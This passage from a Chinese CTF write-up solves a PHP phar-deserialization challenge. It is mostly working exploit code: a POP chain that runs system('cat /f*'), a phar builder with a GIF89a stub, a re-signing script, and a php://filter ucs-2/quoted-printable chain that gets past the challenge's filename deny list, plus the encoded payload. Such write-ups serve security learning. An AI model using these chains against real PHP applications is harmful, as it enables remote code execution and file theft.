<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;这不合理&quot;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;write&#x27;</span>]))&#123;<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename,<span class="hljs-variable">$contents</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;该文件不存在或者内容为空&quot;</span>);<br>            &#125; <br>        &#125;<br><br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$log</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>            (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="代码审计-（只是看代码得出的信息，没有实际操作）"><a href="#代码审计-（只是看代码得出的信息，没有实际操作）" class="headerlink" title="代码审计  （只是看代码得出的信息，没有实际操作）"></a>代码审计  （只是看代码得出的信息，没有实际操作）</h3><p>有两个页面，第一个登陆界面，<code>username=admin,password=admin</code>登录跳转</p><p>第二个页面能够读取文件，若搜索的内容不存在会被写入<code>/var/www/html/log/error.txt</code>中，能够重写文件中的内容</p><ul><li><code>Files.class.php</code>的<code>getFile()</code>的<code>file_get_contents()</code>存在phar反序列化漏洞</li><li>三个文件中存在pop链</li></ul><h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">User::__destruct <span class="hljs-punctuation">-&gt;</span> User::check <span class="hljs-punctuation">-&gt;</span> Myerror::__toString <span class="hljs-punctuation">-&gt;</span> Files::__get<br></code></pre></td></tr></table></figure><p>这里比较难的是User::__destruct中的<code>(@$this-&gt;password)();</code>要使用数组调用函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$name</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>题目中没发现<code>unserialize()</code>，但能查看文件，想到phar反序列化，那<code>phar://</code>又要解析什么文件呢？</p><p>我们想到<code>log/error.txt</code>的内容为报错信息</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/a5WEKMOeYP8zcHg.png" alt="image.png"></p><p>但其中有脏数据，使用<code>php://filter</code>去除</p><p>先想到最后要把phar文件内容之外的变为非合法字符，然后base64-decode，就只剩phar文件的内容</p><p>那如何转化呢，由<code>utf-8</code>转换为<code>utf-16le</code>的字符，它的每一位字符后面都会加上一个<code>\0</code>，这个<code>\0</code>是不可见字符，但当我们将<code>utf-16le</code>转换为<code>utf-8</code>的时候，只有后面有<code>\0</code>的才会被正常转换，其它的就会被当成乱码<img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817062542437.png" alt="image-20230817062542437"></p><p>但<code>utf-16le</code>被ban了，<code>ucs-2</code>的功能与它相同</p><p>然后要对<code>\0</code>进行处理，使用quoted-printable编码</p><p>即：把phar文件内容依次经过<code>base64-encode</code>、<code>convert.iconv.utf-8.ucs-2</code>、<code>quoted-printable-encode</code></p><p>把结果写入log&#x2F;error.txt</p><p>在解码时先<code>quoted-printable-decode</code>、再<code>convert.iconv.ucs-2.utf-8</code>、最后<code>base64-decode</code></p><h3 id="GC回收机制"><a href="#GC回收机制" class="headerlink" title="GC回收机制"></a>GC回收机制</h3><p>在最后解密完后，要<code>phar://</code>，但是phar被ban了</p><p>为了不让它异常退出，这里使用GC回收机制在<code>throw new Error(&quot;这不合理&quot;);</code>之前提前触发__destruct</p><h3 id="最后顺序与实际操作"><a href="#最后顺序与实际操作" class="headerlink" title="最后顺序与实际操作"></a>最后顺序与实际操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Files</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$key</span>)(<span class="hljs-variable language_">$this</span>-&gt;arg);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myerror</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$test</span>=<span class="hljs-variable language_">$this</span>-&gt;message-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;test&#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;username&#125;</span>的密码不正确或不存在该用户&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        (@<span class="hljs-variable language_">$this</span>-&gt;password)();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        (<span class="hljs-variable">$name</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;password = [<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;check&quot;</span>];<br><span class="hljs-variable">$b</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myerror</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Files</span>();<br><span class="hljs-variable">$b</span>-&gt;username-&gt;test = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>-&gt;username-&gt;message-&gt;arg = <span class="hljs-string">&quot;cat /f*&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-literal">null</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>修改内容，最后的<code>i:1</code>改为<code>i:0</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/e4p73WRYbfEic9d.png" alt="image.png"></p><p>修改phar文件内容后要重新进行签名</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">from hashlib <span class="hljs-keyword">import</span> sha1<br>f = open(<span class="hljs-string">&#x27;a.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() <span class="hljs-meta"># 修改内容后的phar文件</span><br>s = f[:<span class="hljs-type">-28</span>] <span class="hljs-meta"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:<span class="hljs-type"></span>] <span class="hljs-meta"># 获取签名类型以及GBMB标识</span><br><span class="hljs-keyword">new</span><span class="hljs-type">f</span> = s+sha1(s).digest()+h <span class="hljs-meta"># 数据 + 签名 + 类型 + GBMB</span><br>open(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(<span class="hljs-keyword">new</span><span class="hljs-type">f</span>) <span class="hljs-meta"># 写入新文件</span><br></code></pre></td></tr></table></figure><p>然后再拿去加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>);<span class="hljs-comment">//获取二进制数据</span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;UCS-2&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//UCS-2编码</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">quoted_printable_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//quoted_printable编码</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/=\r\n/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>)).<span class="hljs-string">&#x27;=00=3D&#x27;</span>);<span class="hljs-comment">//解决软换行导致的编码结构破坏</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>file_put_contents在最后加上&#x3D;00&#x3D;3D是因为在<code>php://filter/convert.iconv.ucs-2.utf-8</code>后会出现个陌生字符</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/E9KxOJMRwmf3qYX.png" alt="image.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">=00R=<span class="hljs-number">000</span>=00l=00G=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=00l=<span class="hljs-number">00h</span>=<span class="hljs-number">00P</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">009</span>=00w=00a=<span class="hljs-number">00H</span>=00A=00g=00X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=00I=<span class="hljs-number">00Q</span>=00U=00x=00U=00X=<span class="hljs-number">000</span>=00N=<span class="hljs-number">00P</span>=<span class="hljs-number">00T</span>=00V=<span class="hljs-number">00B</span>=00J=<span class="hljs-number">00T</span>=00E=00V=00S=00K=00C=00k=<span class="hljs-number">007</span>=00I=<span class="hljs-number">00D</span>=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00D</span>=<span class="hljs-number">00Q</span>=<span class="hljs-number">00o</span>=00w=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00B</span>=00E=00A=00A=00A=00A=<span class="hljs-number">00B</span>=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00D</span>=<span class="hljs-number">005</span>=00A=00A=00A=00A=<span class="hljs-number">00Y</span>=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">000</span>=<span class="hljs-number">00O</span>=00i=00J=00V=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=00V=00z=00Z=00X=00J=00u=<span class="hljs-number">00Y</span>=00W=<span class="hljs-number">001</span>=00l=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00c=00G=00F=00z=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00d</span>=00v=00c=00m=<span class="hljs-number">00Q</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">002</span>=00E=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00a=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00w=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00V=00X=00N=00l=00c=00i=00I=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">004</span>=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">001</span>=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=<span class="hljs-number">00b</span>=00m=00F=<span class="hljs-number">00t</span>=00Z=00S=00I=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">003</span>=<span class="hljs-number">00O</span>=00i=00J=00N=00e=00W=00V=<span class="hljs-number">00y</span>=00c=00m=<span class="hljs-number">009</span>=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00c=<span class="hljs-number">006</span>=00I=00m=<span class="hljs-number">001</span>=00l=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">00h</span>=00Z=<span class="hljs-number">002</span>=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00i=00R=00m=00l=00s=00Z=00X=00M=00i=<span class="hljs-number">00O</span>=00j=00I=<span class="hljs-number">006</span>=00e=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00Z=00m=00l=00s=00Z=00W=<span class="hljs-number">005</span>=<span class="hljs-number">00h</span>=<span class="hljs-number">00b</span>=00W=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=00z=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">00h</span>=00c=00m=00c=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=00N=00z=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00Y</span>=<span class="hljs-number">002</span>=00F=<span class="hljs-number">000</span>=00I=00C=<span class="hljs-number">009</span>=00m=00K=00i=00I=<span class="hljs-number">007</span>=00f=00X=00M=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00d</span>=00G=00V=00z=<span class="hljs-number">00d</span>=00C=00I=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">002</span>=<span class="hljs-number">00O</span>=00i=00J=00z=00e=00X=00N=<span class="hljs-number">000</span>=00Z=00W=<span class="hljs-number">000</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=<span class="hljs-number">00B</span>=<span class="hljs-number">00h</span>=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">003</span>=<span class="hljs-number">00b</span>=<span class="hljs-number">003</span>=00J=00k=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00E=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00O</span>=00i=00J=00j=00a=00G=00V=00j=00a=<span class="hljs-number">00y</span>=00I=<span class="hljs-number">007</span>=00f=00X=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">009</span>=00C=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00L=00n=00R=<span class="hljs-number">004</span>=<span class="hljs-number">00d</span>=00A=00U=00A=00A=00A=<span class="hljs-number">00B</span>=00W=00V=00N=<span class="hljs-number">001</span>=00k=<span class="hljs-number">00B</span>=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00O</span>=00L=00c=00s=<span class="hljs-number">00o</span>=<span class="hljs-number">00q</span>=<span class="hljs-number">002</span>=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00I=00z=00S=00g=00V=00I=00G=<span class="hljs-number">007</span>=00m=00l=<span class="hljs-number">007</span>=00G=00e=<span class="hljs-number">00B</span>=<span class="hljs-number">00t</span>=00l=00l=00I=<span class="hljs-number">00b</span>=<span class="hljs-number">008</span>=00e=00l=00l=00l=00v=00s=<span class="hljs-number">004</span>=00C=00A=00A=00A=00A=00R=<span class="hljs-number">000</span>=00J=00N=<span class="hljs-number">00Q</span>=00g=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070053918.png" alt="image-20230817070053918"></p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt</code></p><p>注意要选上重写文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070203472.png" alt="image-20230817070203472"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070414298.png" alt="image-20230817070414298"></p><p><code>phar://log/error.txt</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070449179.png" alt="image-20230817070449179"></p><h2 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 